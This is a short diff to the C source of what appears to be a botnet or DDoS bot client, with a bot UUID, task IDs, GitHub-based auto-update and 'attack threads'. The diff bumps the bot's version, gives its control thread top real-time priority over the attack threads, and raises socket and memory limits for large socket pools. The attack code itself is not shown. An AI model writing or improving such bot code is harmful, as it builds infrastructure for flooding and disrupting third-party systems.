@@ -10,7 +10,7 @@ char g_bot_uuid[64] = {0};
 char g_cur_task_id[64] = {0};
 
 /* Must match GitHub release tag style for auto-update compare */
-#define BOT_VERSION_TAG "v4.0.26"
+#define BOT_VERSION_TAG "v4.0.29"
 
 static void sig_handler(int sig) { (void)sig; g_shutdown = 1; }
 
@@ -93,16 +93,30 @@ int main(int argc, char *argv[])
     if (mlockall(MCL_CURRENT | MCL_FUTURE) != 0) {
         /* Non-fatal: continue without locked pages */
     }
-    /* Prefer SCHED_FIFO only as root; cap priority so host stays responsive */
+    /* WS main thread: SCHED_FIFO(99) — highest real-time, always preempts attack threads */
     if (geteuid() == 0) {
-        struct sched_param sp = { .sched_priority = 50 };
+        struct sched_param sp = { .sched_priority = 99 };
         (void)sched_setscheduler(0, SCHED_FIFO, &sp);
     }
 
-    /* Raise file descriptor limit for massive socket pools */
-    struct rlimit rl = { 1048576, 1048576 };
-    setrlimit(RLIMIT_NOFILE, &rl);
-    setrlimit(RLIMIT_MEMLOCK, &rl);
+    /* Raise file descriptor limit — safe on non-root (raise soft to hard) */
+    {
+        struct rlimit rl;
+        if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
+            rl.rlim_cur = rl.rlim_max;
+            if (rl.rlim_cur < 65536) rl.rlim_cur = 65536;
+            if (rl.rlim_cur > rl.rlim_max) rl.rlim_cur = rl.rlim_max;
+            setrlimit(RLIMIT_NOFILE, &rl);
+        }
+    }
+    {
+        struct rlimit rl;
+        if (getrlimit(RLIMIT_MEMLOCK, &rl) == 0) {
+            rl.rlim_cur = rl.rlim_max;
+            if (rl.rlim_cur > rl.rlim_max) rl.rlim_cur = rl.rlim_max;
+            setrlimit(RLIMIT_MEMLOCK, &rl);
+        }
+    }
 
     cpu_monitor_start();
 
